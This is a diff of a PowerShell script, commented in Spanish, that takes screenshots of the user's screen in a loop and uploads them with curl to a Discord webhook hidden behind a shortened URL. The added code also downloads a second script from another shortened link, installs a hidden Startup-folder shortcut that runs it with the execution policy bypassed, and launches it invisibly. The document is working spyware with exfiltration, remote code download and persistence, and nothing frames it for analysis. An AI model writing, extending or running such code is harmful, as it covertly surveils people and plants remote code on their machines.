@@ -1,23 +1,15 @@
-# Definir la URL del webhook de Discord
-$hookurl = "$dc"
-# Definir el intervalo de tiempo entre capturas de pantalla en segundos
-$seconds = 30
+$hookurl = "https://bit.ly/chu_kbras"
+$seconds = 30 # Intervalo entre capturas
+$a = 0 # Contador de imágenes enviadas al webhook
+$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected.." 
-    $hookurl = (irm $hookurl).url
-}
+# Detección de URL acortada
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
 
-# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
-While ($true){
-    # Definir la ruta y el nombre de archivo para la captura de pantalla
-    $file1 = "$env:temp\SC1.png"
-    $file2 = "$env:temp\SC2.png"
-    
-    # Tomar la primera captura de pantalla
+do {
+    $Filett = "$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
+    Add-type -AssemblyName System.Drawing
     $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
     $Width = $Screen.Width
     $Height = $Screen.Height
@@ -26,24 +18,35 @@ While ($true){
     $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
-    
-    # Esperar un segundo antes de tomar la segunda captura de pantalla
-    Start-Sleep -Seconds 1
-    
-    # Tomar la segunda captura de pantalla
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
-    
-    # Enviar ambas capturas de pantalla al webhook de Discord
-    curl.exe -F "file1=@$file1" -F "file2=@$file2" $hookurl
-    
-    # Eliminar las capturas de pantalla después de enviarlas
-    Remove-Item -Path $file1
-    Remove-Item -Path $file2
-    
-    # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
-    Start-Sleep -Seconds $seconds
-}
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+    Start-Sleep $seconds
+
+    # Incrementar contador de imágenes enviadas al webhook
+    $a++
+
+    # Verificar si se ha alcanzado la cantidad máxima de imágenes
+    if ($a -eq $maxImages) {
+        # Descargar el script principal
+        $syswUrl = "https://bit.ly/Screen_dc"
+        $syswPath = "$env:USERPROFILE\sysw.ps1"
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
+        
+        # Crear acceso directo en la carpeta de inicio del usuario
+        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutLocation)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
+        $shortcut.Save()
+        
+        # Ejecutar el script principal de manera oculta
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
+        
+        # Reiniciar contador de imágenes
+        $a = 0
+    }
+} while ($true)
